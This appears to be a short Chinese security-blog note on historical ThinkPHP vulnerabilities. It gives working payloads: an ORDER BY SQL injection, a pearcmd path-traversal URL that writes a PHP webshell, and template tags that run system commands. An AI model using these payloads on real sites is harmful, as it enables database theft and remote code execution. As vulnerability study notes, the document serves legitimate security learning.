---
title: thinkphp
featured: true
description: thinkphp历史漏洞分析
tags:
  - php
---

## order注入 CVE-2018-16385

ThinkPHP < 5.1.23

order没有正确过滤, 如果order可控，可以通过这样触发

```
    params = {
        "order[extractvalue(1, concat(0x7e, (select 1)));#`]": "desc"
    }
```

## 文件包含 CVE-2022-47945

thinkphp<=6.0.13
开启多语言时，可以路径穿越，导致任意php文件包含
可以包含pear

```
/?+config-create+/&lang=../../../../../../../../../../../../../../../../../../../../../../../../usr/share/php/pearcmd&/<?=@eval($_REQUEST['cmd']);?>+/tmp/mekrina.php
```

即可写马

## thinkphp<6.09 league组件反序列化

## 模板写入RCE

thinkphp可以对html模板进行编译为php，然后执行。

某些标签会被转变为php代码，如果能控制模板内容就可以RCE

src/App/Core/Lib/Template/ThinkTemplate.class.php#parseTag
危险标签

```php
{:phpinfo()}
<php>phpinfo()</php>
{$var|func}
<include file="/flag">
{layout name="/flag"}
{import file="/flag"}
{~system('whoami')}
```
